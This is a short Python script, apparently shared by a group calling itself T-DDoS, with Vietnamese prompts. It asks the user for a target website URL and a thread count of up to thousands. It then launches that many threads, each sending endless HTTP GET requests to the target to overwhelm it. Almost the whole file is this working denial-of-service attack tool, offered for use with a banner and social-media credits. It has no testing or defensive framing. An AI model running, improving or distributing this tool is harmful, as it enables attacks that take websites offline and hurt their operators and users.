#Vip
#Tool By T-DDoS
import os,json,re,sys

import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
try:
	import requests
except:
	os.system('pip install --upgrade pip && pip install requests')
	import requests
os.system("clear")
import threading
import requests
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("\033[91m< / > Start DDoS < / >")
        except requests.exceptions.ConnectionError:
            print("[error] " + "\033[91mKết Nối Bị Lỗi")
 
threads = 20
print("""
\033[94m╔═══════════════════════════════════════════════╗
                      🍀🔥🍀🌐🌐
                 \033[92m╔╦╗ ╔╦╗╔╦╗┌─┐╔═╗
                  \033[91m║───║║ ║║│ │╚═╗
                  \033[0m╩  ═╩╝═╩╝└─┘╚═╝
        \033[93m➡ Copyright      : 𝐓-𝐃𝐃𝐨𝐒
        \033[93m➡ YouTube        : 𝐓-𝐃𝐃𝐨𝐒
        \033[93m➡ Facebook       : T͢h͢a͢o͢ ͢N͢T͢ ͢Y͢T͢ 
 \033[94m══════════════════════T-DDoS═════════════════════
""")

url = input("\033[93m𝐓𝐡𝐞̂𝐦 𝐔𝐑𝐋  (https//:yoursite.com) ☞ ")
 
try:
    threads = int(input("Threads (10.000) ☞ "))
except ValueError:
    exit("\033[91mThreads Không Chính Xác")
 
if threads == 0:
    exit("\033[91mThreads Phải Trên 0")
 
if not url.__contains__("http"):
    exit("\033[91mURL KHÔNG THÊM http or https")
 
if not url.__contains__("."):
    exit("\033[91mTên Miền Không Hợp Lệ")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")